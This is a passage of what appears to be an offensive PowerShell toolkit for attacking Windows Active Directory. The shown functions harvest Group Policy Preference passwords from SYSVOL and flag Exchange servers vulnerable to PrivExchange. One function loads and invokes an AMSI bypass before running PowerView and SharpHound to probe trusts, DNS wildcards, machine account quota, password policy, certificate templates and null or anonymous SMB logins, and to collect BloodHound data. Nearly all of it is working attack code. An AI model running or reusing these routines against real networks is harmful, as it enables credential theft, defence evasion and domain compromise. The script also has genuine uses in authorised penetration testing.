            if ($Server) {
                $Domains += , $Server
            }
            else {
                # in case we're in a SYSTEM context
                $Domains += , [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
            }
        }

        $Domains = $Domains | Where-Object {$_} | Sort-Object -Unique

        ForEach ($Domain in $Domains) {
            # discover potential domain GPP files containing passwords, not complaining in case of denied access to a directory
            Write-Verbose "[Get-GPPPassword] Searching \\$Domain\SYSVOL\*\Policies. This could take a while."
            $DomainXMLFiles = Get-ChildItem -Force -Path "\\$Domain\SYSVOL\*\Policies" -Recurse -ErrorAction SilentlyContinue -Include @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml')

            if($DomainXMLFiles) {
                $XMLFiles += $DomainXMLFiles
            }
        }

        if ( -not $XMLFiles ) { throw '[Get-GPPPassword] No preference files found.' }

        Write-Verbose "[Get-GPPPassword] Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

        ForEach ($File in $XMLFiles) {
            $Result = (Get-GppInnerField $File.Fullname)
            $Result
        }
    }
    catch { Write-Error $Error[0] }
}
function Get-DomainExchangeVersion {
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    Check Exchange with adsi, thx lkys37en https://github.com/lkys37en/Pentest-Scripts/tree/master/Powershell
    #>
    param (
        [string]$Domain,
        [string]$DistinguishedName
    )
    begin{
        if(!$Domain){
            try{
                $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }catch{
                Write-Output "[-] $($_.Exception.Message)"
                Write-Output "Use runas.exe with -domain and -domaincontroller"
                return
            }
        }
        if(!$DistinguishedName){
            $DistinguishedName = "DC=$($Domain.replace(".", ",DC="))"
        }
        $CN = $Domain.Split('.')[0]
        $ExchangeVersions = @{
            "15.02.0397.003" = "Exchange Server 2019 CU2, Not Vulnerable" 
            "15.02.0330.005" = "Exchange Server 2019 CU1, Not Vulnerable"
            "15.02.0221.012" = "Exchange Server 2019 RTM, Vulnerable to PrivExchange!" 
            "15.02.0196.000" = "Exchange Server 2019 Preview, Vulnerable to PrivExchange!" 
            "15.01.1779.002" = "Exchange Server 2016 CU13, Not Vulnerable"
            "15.01.1713.005" = "Exchange Server 2016 CU12, Vulnerable to PrivExchange!" 
            "15.01.1591.010" = "Exchange Server 2016 CU11, Vulnerable to PrivExchange!" 
            "15.01.1531.003" = "Exchange Server 2016 CU10, Vulnerable to PrivExchange!" 
            "15.01.1466.003" = "Exchange Server 2016 CU9, Vulnerable to PrivExchange!"  
            "15.01.1415.002" = "Exchange Server 2016 CU8, Vulnerable to PrivExchange!"  
            "15.01.1261.035" = "Exchange Server 2016 CU7, Vulnerable to PrivExchange!"  
            "15.01.1034.026" = "Exchange Server 2016 CU6, Vulnerable to PrivExchange!"  
            "15.01.0845.034" = "Exchange Server 2016 CU5, Vulnerable to PrivExchange!"  
            "15.01.0669.032" = "Exchange Server 2016 CU4, Vulnerable to PrivExchange!"  
            "15.01.0544.027" = "Exchange Server 2016 CU3, Vulnerable to PrivExchange!"  
            "15.01.0466.034" = "Exchange Server 2016 CU2, Vulnerable to PrivExchange!"  
            "15.01.0396.030" = "Exchange Server 2016 CU1, Vulnerable to PrivExchange!"  
            "15.01.0225.042" = "Exchange Server 2016 RTM, Vulnerable to PrivExchange!"  
            "15.01.0225.016" = "Exchange Server 2016 Preview, Vulnerable to PrivExchange!" 
            "15.00.1497.002" = "Exchange Server 2013 CU23, Not Vulnerable"
            "15.00.1473.003" = "Exchange Server 2013 CU22, Not Vulnerable!"
            "15.00.1395.004" = "Exchange Server 2013 CU21, Vulnerable to PrivExchange!"
            "15.00.1367.003" = "Exchange Server 2013 CU20, Vulnerable to PrivExchange!"
            "15.00.1365.001" = "Exchange Server 2013 CU19, Vulnerable to PrivExchange!"
            "15.00.1347.002" = "Exchange Server 2013 CU18, Vulnerable to PrivExchange!"
            "15.00.1320.004" = "Exchange Server 2013 CU17, Vulnerable to PrivExchange!"
            "15.00.1293.002" = "Exchange Server 2013 CU16, Vulnerable to PrivExchange!"
            "15.00.1263.005" = "Exchange Server 2013 CU15, Vulnerable to PrivExchange!"
            "15.00.1236.003" = "Exchange Server 2013 CU14, Vulnerable to PrivExchange!"
            "15.00.1210.003" = "Exchange Server 2013 CU13, Vulnerable to PrivExchange!"
            "15.00.1178.004" = "Exchange Server 2013 CU12, Vulnerable to PrivExchange!"
            "15.00.1156.006" = "Exchange Server 2013 CU11, Vulnerable to PrivExchange!"
            "15.00.1130.007" = "Exchange Server 2013 CU10, Vulnerable to PrivExchange!"
            "15.00.1104.005" = "Exchange Server 2013 CU9, Vulnerable to PrivExchange!"
            "15.00.1076.009" = "Exchange Server 2013 CU8, Vulnerable to PrivExchange!"
            "15.00.1044.025" = "Exchange Server 2013 CU7, Vulnerable to PrivExchange!"
            "15.00.0995.029" = "Exchange Server 2013 CU6, Vulnerable to PrivExchange!"
            "15.00.0913.022" = "Exchange Server 2013 CU5, Vulnerable to PrivExchange!"
            "15.00.0847.032" = "Exchange Server 2013 SP1, Vulnerable to PrivExchange!"
            "15.00.0775.038" = "Exchange Server 2013 CU3, Vulnerable to PrivExchange!"
            "15.00.0712.024" = "Exchange Server 2013 CU2, Vulnerable to PrivExchange!"
            "15.00.0620.029" = "Exchange Server 2013 CU1, Vulnerable to PrivExchange!"
            "15.00.0516.032" = "Exchange Server 2013 RTM, Vulnerable to PrivExchange!"
        }
    }
    process{
        try{
            $ExchangeVersion = ([ADSI]"LDAP://cn=$CN,cn=Microsoft Exchange,cn=Services,cn=Configuration,$DistinguishedName").msExchProductID
        }catch{
            Write-Output "Failed connecting to ldap"
            Write-Output "[-] $($_.Exception.Message)"
            return
        }
        if($ExchangeVersion){
            Write-Output "Exchange version $ExchangeVersion, $($ExchangeVersions[$ExchangeVersion])"
        }else{
            Write-Output "Could not find exchange version"
        }
    }
}
function Invoke-DomainEnum{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    Invoke-Domain -DomainController 192.168.3.10 -Domain hackme.local
    #>
    param (
        [string]$DomainController,
        [string]$Domain,
        [string]$DistinguishedName
    )
    begin{
        #Set variables
        if(!$DomainController -or !$Domain){
            try{
                $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }catch{
                Write-Output "[-] $($_.Exception.Message)"
                Write-Output "Use runas.exe with -domain and -domaincontroller"
                return
            }
        }
        if(!$Domain){
            $Domain = $current_domain.Name
        }

        if(!$DomainController){
            $DomainController = $current_domain.PdcRoleOwner.Name
        }

        if(!$DistinguishedName){
            $DistinguishedName = "DC=$($Domain.replace(".", ",DC="))"
        }else{
            $DistinguishedName = $DistinguishedName
        }

        #Checks dependensies
        @(
            'ASBBypass.ps1'
            'PowerView.ps1'
            'SharpHound.ps1'
        ) | foreach {
            if(-not(Test-Path $PSScriptRoot\$_)){
                Write-Output "Missing dependencies.. $($_)"
                $missing=$true
            }
        }
        if($missing){
            return
        }
        . $PSScriptRoot\ASBBypass.ps1
        . $PSScriptRoot\PowerView.ps1
        . $PSScriptRoot\SharpHound.ps1
        Invoke-Bypass | Out-Null
    }
    process{
        #Check Trust https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
        Write-Output "`n[*] Looking for Domain Trust"
        try{
            Get-DomainTrust -Domain $Domain -DomainController $DomainController -ErrorAction stop
        }catch{
            Write-Output "[-] Domain trust Failed"
        }

        #https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
        #https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1
        Write-Output "`n[*] Looking for CPasswords in Sysvol"
        try{
            Get-GroupPolicyPassword -Server $DomainController -ErrorAction stop -SearchForest
        }catch{
            Write-Output "[-] CPasswords in Sysvol Failed" 
        }

        #Active Directory Integrated DNS Wilcard Record https://blog.netspi.com/exploiting-adidns/
        Write-Output "`n[*] Testing Active Directory Integrated DNS Wilcard Record"
        try{
            $zones=(Get-DomainDNSZone -Domain $Domain -DomainController $DomainController).ZoneName | where {$_ -notlike 'RootDNSServers'}
        }catch{
            Write-Output "[-] Testing for Active Directory Integrated DNS Wilcard Record Failed" 
        }
        foreach($zone in $zones){
            $records=(Get-DomainDNSRecord -ZoneName $zone -Domain $Domain -DomainController $DomainController).name
            $wildcard = $false
            foreach($record in $records){
                if($record -contains '*'){
                    Write-Output "[+] Wildcard record exists for zone $zone" 
                    $wildcard = $true
                    break
                }
            }
            if(-not $wildcard){
            Write-Output "[-] Wildcard record does not exists for zone $zone" 
            }
        }

        #Machine Account Quota https://blog.netspi.com/machineaccountquota-is-useful-sometimes/
        Write-Output "`n[*] Testing ms-DS-MachineAccountQuota"
        Try{
            $adsi=Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ErrorAction stop
        }
        Catch{
            Write-Output "[-] Testing for ms-DS-MachineAccountQuota failed." 
        }
        $maq=($adsi.FindOne()).properties.'ms-ds-machineaccountquota'
        Write-Host "MachineAccountQuota: $maq"

        #Accounts with high badpwdcount
        Write-Output "`n[*] Accounts with high badpwdcount"
        Get-DomainUser -Properties badpwdcount,samaccountname | where -Property badpwdcount -ge 3

        #Domain Password Policy
        Write-Output "`n[*] Testing Domain Password Policy"
        try{
            (Get-DomainPolicy -Domain $Domain -DomainController $DomainController -ErrorAction stop).SystemAccess
            (Get-DomainPolicy -Domain $Domain -DomainController $DomainController -ErrorAction stop).RegistryValues
            (Get-DomainPolicy -Domain $Domain -DomainController $DomainController -ErrorAction stop).KerberosPolicy
        }catch{
            Write-Output "[-] Testing for Domain Password Policy Failed." 
        }

        Write-Output "`n[*] Testing Exchange version"
        Get-DomainExchangeVersion -Domain $Domain -DistinguishedName $DistinguishedName

        Write-Output "`n[*] Testing CA certificate templates"
        Get-DomainCertificates -Domain $Domain -DistinguishedName $DistinguishedName

        #nullsession on DC's
        Write-Output "`n[*] Testing NullSession Login on Domain Controllers"
        (Get-DomainController -Domain $Domain).displayname | foreach {
            try{
                New-SmbMapping -RemotePath \\$_\ipc$ -UserName '' -Password '' -ErrorAction stop
                New-Object  PSObject -Property @{
                    "ComputerName" = $_
                    "Status"       = $true
                }
            }
            catch{}
        }

        #anonymous on DC's
        Write-Output "`n[*] Testing Anonymous Login on Domain Controllers"
        (Get-DomainController -Domain $Domain).displayname | foreach {
            try{
                New-SmbMapping -RemotePath \\$_\ipc$ -UserName 'anonymous' -Password '' -ErrorAction stop
                New-Object  PSObject -Property @{
                    "ComputerName" = $_
                    "Status"       = $true
                }
            }
            catch{}
        }

        #bloodhound https://github.com/BloodHoundAD/BloodHound/
        Write-Output "`n[*] Running BloodHound.."
        invoke-bloodhound -collectionmethod all,GPOLocalGroup,LoggedOn -domain $Domain -SkipPing
    }
}